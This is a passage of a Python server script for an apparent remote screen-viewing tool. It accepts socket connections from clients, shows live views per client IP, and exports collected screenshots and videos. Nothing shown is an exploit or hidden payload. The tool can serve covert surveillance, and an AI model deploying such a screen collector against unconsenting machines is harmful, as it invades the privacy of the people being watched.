    print(f"\n{Fore.YELLOW}--- Export Data ---{Style.RESET_ALL}")
    
    print(f"{Fore.WHITE}1. Export all data")
    print(f"2. Export screenshots only")
    print(f"3. Export videos only")
    print(f"4. Back to previous menu{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.GREEN}Select an option: {Style.RESET_ALL}")
    
    export_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'ScreenViewerExport')
    
    if choice == "1":
        export_all_data(export_path)
    elif choice == "2":
        export_screenshots(export_path)
    elif choice == "3":
        export_videos(export_path)
    elif choice == "4":
        return
    else:
        show_notification("Invalid option. Please try again.", Fore.RED)
        time.sleep(1)

def export_all_data(export_path):
    """Export all captured data to the specified path"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        export_dir = f"{export_path}_{timestamp}"
        os.makedirs(export_dir, exist_ok=True)
        
        # Create subdirectories
        screenshots_dir = os.path.join(export_dir, "screenshots")
        videos_dir = os.path.join(export_dir, "videos")
        os.makedirs(screenshots_dir, exist_ok=True)
        os.makedirs(videos_dir, exist_ok=True)
        
        # Copy screenshots
        screenshots = [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith('.jpg')]
        for screenshot in screenshots:
            shutil.copy2(os.path.join(SCREENSHOT_DIR, screenshot), os.path.join(screenshots_dir, screenshot))
        
        # Copy videos
        videos = [f for f in os.listdir(VIDEO_DIR) if f.endswith('.mp4')]
        for video in videos:
            shutil.copy2(os.path.join(VIDEO_DIR, video), os.path.join(videos_dir, video))
        
        show_notification(f"Exported {len(screenshots)} screenshots and {len(videos)} videos to {export_dir}")
    except Exception as e:
        show_notification(f"Error exporting data: {str(e)[:50]}", Fore.RED)
    
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def export_screenshots(export_path):
    """Export only screenshots to the specified path"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        export_dir = f"{export_path}_screenshots_{timestamp}"
        os.makedirs(export_dir, exist_ok=True)
        
        # Copy screenshots
        screenshots = [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith('.jpg')]
        for screenshot in screenshots:
            shutil.copy2(os.path.join(SCREENSHOT_DIR, screenshot), os.path.join(export_dir, screenshot))
        
        show_notification(f"Exported {len(screenshots)} screenshots to {export_dir}")
    except Exception as e:
        show_notification(f"Error exporting screenshots: {str(e)[:50]}", Fore.RED)
    
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def export_videos(export_path):
    """Export only videos to the specified path"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        export_dir = f"{export_path}_videos_{timestamp}"
        os.makedirs(export_dir, exist_ok=True)
        
        # Copy videos
        videos = [f for f in os.listdir(VIDEO_DIR) if f.endswith('.mp4')]
        for video in videos:
            shutil.copy2(os.path.join(VIDEO_DIR, video), os.path.join(export_dir, video))
        
        show_notification(f"Exported {len(videos)} videos to {export_dir}")
    except Exception as e:
        show_notification(f"Error exporting videos: {str(e)[:50]}", Fore.RED)
    
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def close_all_viewers():
    """Close all active viewer windows"""
    global active_viewers
    
    if OPENCV_AVAILABLE:
        try:
            for client_ip in list(active_viewers):
                cv2.destroyWindow(f"Live View - {client_ip}")
            active_viewers.clear()
        except:
            pass

def main():
    """Main function to start the server"""
    print(display_banner())
    print(f"{Fore.YELLOW}Starting server on {HOST}:{PORT}...{Style.RESET_ALL}")
    
    # Create server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        
        print(f"{Fore.GREEN}Server started! Listening for connections...{Style.RESET_ALL}")
        
        # Start a thread to accept connections
        def accept_connections():
            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                    print(f"{Fore.GREEN}[+] Connection from {client_address[0]}:{client_address[1]}{Style.RESET_ALL}")
                    
                    # Start a thread to handle the client
                    client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
                    client_thread.daemon = True
                    client_thread.start()
                except Exception as e:
                    if "Bad file descriptor" in str(e):
                        # Server socket closed, exit thread
                        break
                    print(f"{Fore.RED}[!] Error accepting connection: {str(e)}{Style.RESET_ALL}")
        
        accept_thread = threading.Thread(target=accept_connections)
        accept_thread.daemon = True
        accept_thread.start()
        
        # Display the menu
        display_menu()
        
    except Exception as e:
        print(f"{Fore.RED}[!] Error starting server: {str(e)}{Style.RESET_ALL}")
    finally:
        # Clean up
        try:
            server_socket.close()
        except:
            pass
        
        # Close all viewers
        close_all_viewers()

if __name__ == "__main__":
    main()
